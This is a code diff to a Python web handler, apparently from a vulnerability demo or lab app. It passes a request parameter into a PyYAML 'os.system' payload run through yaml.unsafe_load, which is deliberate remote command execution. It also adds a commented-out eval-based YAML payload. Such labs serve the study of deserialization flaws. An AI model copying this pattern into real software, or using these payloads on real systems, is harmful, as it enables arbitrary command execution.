@@ -23,9 +23,20 @@ def yaml_post_e():
         code = ser['code']
     else:
         return SerializerJsonResponse(None, 202, "params error")
+
+    # whoami
     exp = """!!python/object/apply:os.system ['{}']""".format(code)
-    # yaml.__version__ < 5.1 hook yaml.load()  default UnsafeLoader
     end = yaml.unsafe_load(exp)
+
+    # https://github.com/yaml/pyyaml/issues/420
+    # __import__('os').system('whoami')
+#     exp = """
+# !!python/object/new:tuple
+# - !!python/object/new:map
+#   - !!python/name:eval
+#   - [ "{}" ]""".format(code)
+#     end = yaml.load(exp)
+
     return SerializerJsonResponse(end)
 
 
